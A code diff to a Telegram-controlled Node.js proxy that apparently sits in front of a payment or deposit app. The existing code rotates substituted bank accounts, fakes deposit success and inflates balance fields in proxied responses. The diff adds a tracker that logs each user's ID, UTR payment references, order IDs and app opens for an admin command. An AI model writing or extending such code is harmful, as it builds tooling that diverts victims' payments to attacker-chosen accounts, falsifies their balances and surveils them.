@@ -26,7 +26,7 @@ async function ensureWebhook() {
   } catch (e) {}
 }
 
-const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {} };
+const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {} };
 
 async function loadData() {
   try {
@@ -34,10 +34,22 @@ async function loadData() {
     if (data) {
       if (typeof data === 'string') data = JSON.parse(data);
       if (!data.userOverrides) data.userOverrides = {};
+      if (!data.trackedUsers) data.trackedUsers = {};
       return data;
     }
   } catch (e) {}
-  return { ...DEFAULT_DATA, userOverrides: {} };
+  return { ...DEFAULT_DATA, userOverrides: {}, trackedUsers: {} };
+}
+
+async function trackUser(bankData, userId, info) {
+  if (!userId || userId === 'N/A') return;
+  if (!bankData.trackedUsers) bankData.trackedUsers = {};
+  const existing = bankData.trackedUsers[String(userId)] || {};
+  bankData.trackedUsers[String(userId)] = {
+    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+    lastAction: info || existing.lastAction || '',
+    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0)
+  };
 }
 
 async function saveData(data) {
@@ -417,7 +429,7 @@ Example:
         const overrides = bankData.userOverrides || {};
         const ids = Object.keys(overrides);
         if (ids.length === 0) {
-          await bot.sendMessage(chatId, '📋 No per-ID overrides set.');
+          await bot.sendMessage(chatId, '📋 No per-ID overrides set.\nUse /id track to see detected users.');
         } else {
           let msg = '📋 Per-ID Overrides:\n\n';
           for (const uid of ids) {
@@ -428,6 +440,24 @@ Example:
             if (uo.bankIndex !== undefined) parts.push('🏦 Bank #' + (uo.bankIndex + 1));
             msg += `👤 ${uid}: ${parts.join(' | ')}\n`;
           }
+          await bot.sendMessage(chatId, msg);
+        }
+        return res.sendStatus(200);
+      }
+
+      if (idCmd === 'track') {
+        const tracked = bankData.trackedUsers || {};
+        const ids = Object.keys(tracked);
+        if (ids.length === 0) {
+          await bot.sendMessage(chatId, '📋 No users detected yet.\nUsers will appear here when they make orders or UTR uploads.');
+        } else {
+          let msg = '📋 Detected Users:\n\n';
+          for (const uid of ids) {
+            const u = tracked[uid];
+            const hasOverride = bankData.userOverrides && bankData.userOverrides[uid] ? ' ⚙️' : '';
+            msg += `👤 ${uid}${hasOverride}\n   Last: ${u.lastAction || 'N/A'}\n   Seen: ${u.lastSeen || 'N/A'}\n   Orders: ${u.orderCount || 0}\n\n`;
+          }
+          msg += '⚙️ = has per-ID override\nUse /id status <userId> for details';
           await bot.sendMessage(chatId, msg);
         }
         return res.sendStatus(200);
@@ -749,6 +779,10 @@ UTR: ${b.utr || 'N/A'}
 Amount: ₹${b.utrAmount || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
+    if (userId !== 'N/A') {
+      trackUser(bankData, userId, `UTR ${b.utr || ''}`);
+      saveData(bankData).catch(() => {});
+    }
   }
   await transparentProxy(req, res);
 });
@@ -798,6 +832,12 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(() => {});
     }
 
+    if (detectedUserId) {
+      const orderId = jsonResp?.data?.orderId || '';
+      trackUser(bankData, detectedUserId, `Order ${orderId}`);
+      saveData(bankData).catch(() => {});
+    }
+
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch (e) {
     console.error('Proxy+replace error:', req.method, req.originalUrl, e.message);
@@ -814,6 +854,11 @@ async function proxyAndAddBonus(req, res) {
     const detectedUserId = extractUserId(req, jsonResp);
     const eff = getEffectiveSettings(bankData, detectedUserId);
     const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
+
+    if (detectedUserId) {
+      trackUser(bankData, detectedUserId, `App Open ${req.path}`);
+      saveData(bankData).catch(() => {});
+    }
 
     if (bonus > 0 && jsonResp && jsonResp.data) {
       addBonusToBalanceFields(jsonResp.data, bonus);
